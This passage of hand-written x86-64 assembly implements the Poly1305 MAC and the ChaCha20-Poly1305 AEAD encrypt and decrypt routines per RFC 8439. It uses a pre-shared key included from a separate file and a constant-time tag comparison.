    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    leave
    ret


; ============================================================
; Poly1305 implementation
; ============================================================

; poly1305_mac — compute Poly1305 MAC
; RCX = key ptr (32 bytes: r[16] || s[16])
; RDX = message ptr
; R8D = message length
; R9  = tag output ptr (16 bytes)
poly1305_mac:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 128
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15

    mov     rsi, rdx            ; message
    mov     edi, r8d            ; msg length
    mov     r14, r9             ; tag output

    ; Load r (first 16 bytes of key) and clamp
    mov     rax, [rcx]          ; r_lo
    mov     rdx, [rcx+8]       ; r_hi

    ; Clamp r per RFC 8439 Section 2.5
    ; Clear top 4 bits of bytes 3, 7, 11, 15
    ; Clear bottom 2 bits of bytes 4, 8, 12
    mov     r8, 0x0ffffffc0ffffffc
    mov     r9, 0x0ffffffc0fffffff
    and     rax, r9
    and     rdx, r8

    mov     r12, rax            ; r_lo (clamped)
    mov     r13, rdx            ; r_hi (clamped)

    ; Load s (last 16 bytes of key)
    mov     r10, [rcx+16]      ; s_lo
    mov     r11, [rcx+24]      ; s_hi
    ; Save s on stack
    mov     [rbp-16], r10
    mov     [rbp-8], r11

    ; Initialize accumulator a = 0 (3 limbs)
    xor     eax, eax
    mov     [rbp-40], rax       ; a_lo
    mov     [rbp-32], rax       ; a_hi
    mov     [rbp-24], rax       ; a_carry (2 bits)

.poly_block_loop:
    cmp     edi, 0
    jle     .poly_finalize

    ; Load next block (up to 16 bytes)
    ; Zero the block buffer first
    mov     qword [rbp-56], 0
    mov     qword [rbp-48], 0

    mov     ecx, 16
    cmp     ecx, edi
    cmovg   ecx, edi            ; min(16, remaining)
    ; Copy bytes
    xor     edx, edx
.poly_copy_block:
    cmp     edx, ecx
    jge     .poly_block_copied
    movzx   eax, byte [rsi + rdx]
    mov     [rbp-56+rdx], al
    inc     edx
    jmp     .poly_copy_block
.poly_block_copied:
    ; Set the hibit (byte after last data byte = 0x01)
    cmp     ecx, 16
    jl      .poly_partial
    ; Full block: hibit = 1 (add 2^128 via accumulator arithmetic)
    mov     eax, 1
    jmp     .poly_add_block
.poly_partial:
    ; Partial block: set byte after data to 0x01 (padding)
    mov     byte [rbp-56+rdx], 1
    xor     eax, eax            ; hibit = 0 for partial
.poly_add_block:
    ; Add block to accumulator
    ; block = [rbp-56] (lo), [rbp-48] (hi)
    mov     r8, [rbp-56]
    mov     r9, [rbp-48]

    ; a += block
    add     r8, [rbp-40]        ; a_lo + block_lo
    adc     r9, [rbp-32]        ; a_hi + block_hi
    mov     rdx, [rbp-24]       ; a_carry
    adc     rdx, rax            ; + hibit
    mov     [rbp-40], r8
    mov     [rbp-32], r9
    mov     [rbp-24], rdx

    ; Multiply accumulator by r
    ; a = a_lo + a_hi*2^64 + a_carry*2^128
    ; r = r_lo + r_hi*2^64
    ; We need: (a * r) mod (2^130 - 5)

    ; Partial products:
    ; a_lo * r_lo -> [d0:d1]
    ; a_lo * r_hi -> [d1:d2]
    ; a_hi * r_lo -> [d1:d2]
    ; a_hi * r_hi -> [d2:d3]
    ; a_carry * r_lo -> [d2]
    ; a_carry * r_hi -> [d3]

    mov     rax, [rbp-40]       ; a_lo
    mul     r12                 ; a_lo * r_lo
    mov     r8, rax             ; d0
    mov     r9, rdx             ; d1

    mov     rax, [rbp-40]       ; a_lo
    mul     r13                 ; a_lo * r_hi
    add     r9, rax
    adc     rdx, 0
    mov     r10, rdx            ; d2

    mov     rax, [rbp-32]       ; a_hi
    mul     r12                 ; a_hi * r_lo
    add     r9, rax
    adc     r10, rdx
    mov     r11, 0
    adc     r11, 0              ; d3

    mov     rax, [rbp-32]       ; a_hi
    mul     r13                 ; a_hi * r_hi
    add     r10, rax
    adc     r11, rdx

    mov     rax, [rbp-24]       ; a_carry
    mul     r12                 ; a_carry * r_lo
    add     r10, rax
    adc     r11, rdx

    mov     rax, [rbp-24]       ; a_carry
    mul     r13                 ; a_carry * r_hi
    add     r11, rax
    ; rdx overflow is beyond 2^256, ignored

    ; Result in r11:r10:r9:r8 (256 bits)
    ; Reduce mod 2^130 - 5
    ; 2^130 = 5 (mod p), so bits above 130 get multiplied by 5 and added back

    ; Extract bits 130+ from r10:r11
    ; Bit 130 is bit 2 of r10 (since r8=bits 0-63, r9=bits 64-127, r10=bits 128-191)
    mov     rax, r10
    shrd    rax, r11, 2         ; shift right by 2: bits 130+ -> bits 128+
    shr     r11, 2
    and     r10, 3              ; keep only bits 128-129 in r10

    ; Multiply overflow by 5 using mul (lea truncates to 64 bits, losing carry)
    ; overflow = rax + r11*2^64, need full (overflow * 5) added to r8:r9:r10
    push    r11                 ; save high_overflow
    mov     rcx, 5
    mul     rcx                 ; rdx:rax = low_overflow * 5
    add     r8, rax
    adc     r9, rdx
    adc     r10, 0

    pop     rax                 ; high_overflow
    mul     rcx                 ; rdx:rax = high_overflow * 5
    add     r9, rax
    adc     r10, rdx

    ; Second reduction pass (r10 may have bits above 2 again)
    mov     rax, r10
    shr     rax, 2
    and     r10, 3
    mul     rcx                 ; rdx:rax = second_overflow * 5 (rcx still 5)
    add     r8, rax
    adc     r9, rdx
    adc     r10, 0

    ; Store accumulator
    mov     [rbp-40], r8
    mov     [rbp-32], r9
    mov     [rbp-24], r10

    ; Advance message pointer
    add     rsi, 16
    sub     edi, 16
    ; Note: edi could go negative for partial last block, that's ok
    ; because we check at top of loop
    cmp     edi, 0
    jg      .poly_block_loop

.poly_finalize:
    ; Final reduction: if a >= p (2^130-5), compute a -= p (i.e., a = a+5-2^130)
    ; a = a_lo + a_hi*2^64 + a_carry*2^128
    mov     r8, [rbp-40]        ; a_lo
    mov     r9, [rbp-32]        ; a_hi
    mov     r10, [rbp-24]       ; a_carry (0-3)

    ; Compute t = a + 5
    mov     rax, r8
    add     rax, 5
    mov     rdx, r9
    adc     rdx, 0
    mov     rcx, r10
    adc     rcx, 0

    ; If t >= 2^130 (bit 2+ of rcx set, or rcx >= 4), then a >= p
    shr     rcx, 2              ; rcx = 1 if overflow, 0 if not
    ; If rcx=1, use t (with bits 130+ cleared); else use original a
    neg     rcx                 ; 0 -> 0, 1 -> 0xFFFFFFFFFFFFFFFF
    ; mask = rcx (all 1s if overflow, all 0s if not)
    ; result = (t & mask) | (a & ~mask)
    ; Simplified: if mask, use reduced values (rax, rdx); else use r8, r9
    ; When mask=1: rax already has a+5 low, rdx has a+5 hi
    ; Need to clear bits 130+ from rdx — but actually after shr/neg we just select
    mov     rbx, rcx            ; mask
    ; reduced = a+5 with bits 130+ cleared: rax, rdx (rcx was shifted out)
    and     rax, rbx            ; t_lo & mask
    and     rdx, rbx            ; t_hi & mask
    not     rbx                 ; ~mask
    and     r8, rbx             ; a_lo & ~mask
    and     r9, rbx             ; a_hi & ~mask
    or      rax, r8             ; final a_lo
    or      rdx, r9             ; final a_hi

    ; tag = (a + s) mod 2^128
    add     rax, [rbp-16]       ; + s_lo
    adc     rdx, [rbp-8]        ; + s_hi

    ; Store tag (low 128 bits)
    mov     [r14], rax
    mov     [r14+8], rdx

    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    leave
    ret


; ============================================================
; AEAD ChaCha20-Poly1305
; ============================================================

; aead_encrypt — encrypt and authenticate
; RCX = nonce ptr (12 bytes)
; RDX = plaintext ptr
; R8D = plaintext length
; R9  = output ptr (will contain ciphertext + mac)
; Returns: EAX = ciphertext + mac length
; Uses PSK from key.inc
aead_encrypt:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 160            ; working space
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15

    mov     r12, rcx            ; nonce
    mov     r13, rdx            ; plaintext
    mov     r14d, r8d           ; pt length
    mov     r15, r9             ; output

    ; Step 1: Generate Poly1305 one-time key
    ; ChaCha20 block with counter=0, take first 32 bytes
    call    .get_psk
%include "key.inc"
.get_psk:
    pop     rbx                 ; rbx = psk_key address
    push    rbx                 ; save for later

    mov     rcx, rbx            ; key
    mov     rdx, r12            ; nonce
    xor     r8d, r8d            ; counter = 0
    lea     r9, [rbp - 64]     ; keystream output (64 bytes)
    call    chacha20_block
    ; First 32 bytes of keystream = poly1305 one-time key at [rbp-64]

    ; Step 2: Copy plaintext to output and encrypt in-place
    ; Copy plaintext to output
    xor     ecx, ecx
.copy_pt:
    cmp     ecx, r14d
    jge     .copy_pt_done
    mov     al, [r13 + rcx]
    mov     [r15 + rcx], al
    inc     ecx
    jmp     .copy_pt
.copy_pt_done:

    ; Encrypt output in-place with counter starting at 1
    pop     rbx                 ; psk_key address
    mov     rcx, rbx            ; key
    mov     rdx, r12            ; nonce
    mov     r8, r15             ; data (output buf, will be encrypted in-place)
    mov     r9d, r14d           ; length
    sub     rsp, 48             ; shadow + stack arg
    mov     dword [rsp+32], 1   ; counter = 1
    call    chacha20_encrypt
    add     rsp, 48

    ; Step 3: Compute Poly1305 MAC per RFC 8439 (in-place)
    ; mac_data = pad16(ciphertext) || le64(0) || le64(ct_len)
    ; Build mac_data directly in output buffer (ct already there)
    mov     eax, r14d           ; ct_len
    add     eax, 15
    and     eax, -16            ; padded_ct_len = (ct_len + 15) & ~15
    mov     ebx, eax            ; save padded len

    ; Zero-pad ct to 16-byte boundary (bytes ct_len..padded_len-1)
    mov     ecx, r14d
.pad_ct:
    cmp     ecx, ebx
    jge     .add_lengths
    mov     byte [r15 + rcx], 0
    inc     ecx
    jmp     .pad_ct
.add_lengths:
    ; Append le64(aad_len=0) || le64(ct_len) right after padded ct
    ; This temporarily overwrites the MAC tag area, which is fine
    ; since we haven't written the MAC yet
    mov     qword [r15 + rbx], 0       ; aad_len = 0
    mov     eax, r14d
    mov     [r15 + rbx + 8], rax       ; ct_len as le64

    ; Total mac_data length
    lea     r8d, [ebx + 16]            ; padded_ct + 16

    ; Compute Poly1305 MAC
    lea     rcx, [rbp - 64]            ; poly1305 one-time key
    mov     rdx, r15                   ; mac_data = output buf (ct in-place)
    ; r8d already set
    lea     r9, [r15 + r14]            ; tag output = right after ciphertext
    call    poly1305_mac

    ; Return ct_len + 16 (mac)
    lea     eax, [r14d + 16]

    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    leave
    ret


; aead_decrypt — verify and decrypt
; RCX = nonce ptr (12 bytes)
; RDX = ct+mac ptr
; R8D = ct+mac length
; R9  = output ptr (plaintext)
; Returns: EAX = plaintext length, or -1 on MAC failure
; Uses PSK from key.inc
aead_decrypt:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 160
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13
    push    r14
    push    r15

    mov     r12, rcx            ; nonce
    mov     r13, rdx            ; ct+mac
    mov     r14d, r8d           ; ct+mac length
    mov     r15, r9             ; output

    ; ct_len = total - 16 (mac)
    sub     r14d, 16
    js      .decrypt_fail       ; too short

    ; Step 1: Generate Poly1305 one-time key
    call    .get_psk2
%include "key.inc"
.get_psk2:
    pop     rbx
    push    rbx

    mov     rcx, rbx            ; key
    mov     rdx, r12            ; nonce
    xor     r8d, r8d            ; counter = 0
    lea     r9, [rbp - 64]
    call    chacha20_block

    ; Step 2: Copy ciphertext to output, build mac_data in-place, verify MAC
    ; Copy ciphertext to output buffer
    xor     ecx, ecx
.dec_copy:
    cmp     ecx, r14d
    jge     .dec_copy_done
    mov     al, [r13 + rcx]
    mov     [r15 + rcx], al
    inc     ecx
    jmp     .dec_copy
.dec_copy_done:

    ; Pad and add lengths in-place for MAC computation
    mov     eax, r14d
    add     eax, 15
    and     eax, -16
    mov     ebx, eax            ; padded_ct_len

    ; Zero-pad ct to 16-byte boundary
    mov     ecx, r14d
.dec_pad:
    cmp     ecx, ebx
    jge     .dec_add_lengths
    mov     byte [r15 + rcx], 0
    inc     ecx
    jmp     .dec_pad
.dec_add_lengths:
    mov     qword [r15 + rbx], 0       ; aad_len = 0
    mov     eax, r14d
    mov     [r15 + rbx + 8], rax       ; ct_len as le64

    ; Compute expected MAC
    lea     r8d, [ebx + 16]
    lea     rcx, [rbp - 64]     ; poly1305 key
    mov     rdx, r15             ; mac_data (ct in-place)
    lea     r9, [rbp - 96]      ; computed tag (16 bytes)
    call    poly1305_mac

    ; Constant-time compare computed tag with received tag
    lea     rsi, [rbp - 96]           ; computed
    lea     rdi, [r13 + r14]          ; received (after ciphertext)
    xor     eax, eax
    mov     ecx, 16
.cmp_tag:
    dec     ecx
    mov     bl, [rsi + rcx]
    xor     bl, [rdi + rcx]
    or      al, bl
    test    ecx, ecx
    jnz     .cmp_tag
    test    al, al
    jnz     .decrypt_fail_pop   ; MAC mismatch

    ; Step 3: Decrypt output in-place (ct already copied to r15)
    ; Decrypt output in-place with chacha20 counter=1
    pop     rbx                 ; psk_key address (remove extra push)
    mov     rcx, rbx            ; key
    mov     rdx, r12            ; nonce
    mov     r8, r15             ; data (output buf with ciphertext)
    mov     r9d, r14d           ; data length
    sub     rsp, 48
    mov     dword [rsp+32], 1   ; counter = 1
    call    chacha20_encrypt
    add     rsp, 48

    mov     eax, r14d           ; return plaintext length
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    ; rbx already popped above
    leave
    ret


.decrypt_fail_pop:
    pop     rbx                 ; remove extra push from call/pop trick
.decrypt_fail:
    mov     eax, -1
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    leave
    ret
